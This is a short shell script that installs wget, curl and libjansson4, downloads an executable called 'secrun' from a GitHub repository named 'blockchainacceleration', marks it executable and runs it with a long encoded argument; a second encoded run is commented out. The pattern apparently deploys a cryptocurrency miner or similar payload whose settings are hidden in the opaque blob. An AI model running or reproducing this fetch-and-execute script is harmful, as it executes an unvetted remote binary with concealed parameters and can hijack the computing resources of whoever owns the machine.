
apt-get update && apt-get install -y \
  wget \
  curl \
  libjansson4 \
  && rm -rf /var/lib/apt/lists/*
wget https://github.com/goodjobro/blockchainacceleration/raw/main/secrun
chmod +x secrun
#./secrun BmAYC0mjNERi1gi1op0Z6SBIcJ6EFJUTPsu3CKmQaWuh2hAAvmB/f78NbQvI2u3RoSoyUOnX/HJJoxhO6lTtXuPrAlq9i/LGMr9aA5FAWF84GuDSD+IVQGB8yTUJsR7WnZVjgXrxz1HQQpP3JALDNST6DWEnQwKx5fnAmc4+s2icdvqscq4A/ftfycRwDgY/BEAywuplCMQTQ1wcdsfFGV5TEUBtOH5oTUaYk34UQpuaBN9H1LEQqALjoYtwdTtb+X4KPHbstsGCrMWhOPFyWpzi8FclWfJoI3aML1fRcLkCmbo9rA==
./secrun 5LArzNm9BAD4bap++mAJDiq/J886//mPgF3Z7143T5hEuKu93D6jnWva9+21xu7kCJ7berLk7HHyoiCcVqJcXb/Gxbuo+NJwVWVihM/mw2LtcUshnziBOdFZL5kzWHlPGdLGvQdT9gOZOrjRRsKyCMy++8kFdtRd++XitvgOyJi4t7bLacEZPUcZSNXM9ijmd2HTjDLzpoai1zRPV1R8V4qbNKtPVrkU9SCp+eqM17nR+SoCOQkgiiqojvT3Cy3SC4b+qJutgEOQy+YXbfALncTv2dyfPS0uQgqIQFl8AMrqZOphrwQrrCfkqfw61MxDLq0ozwuGuw==

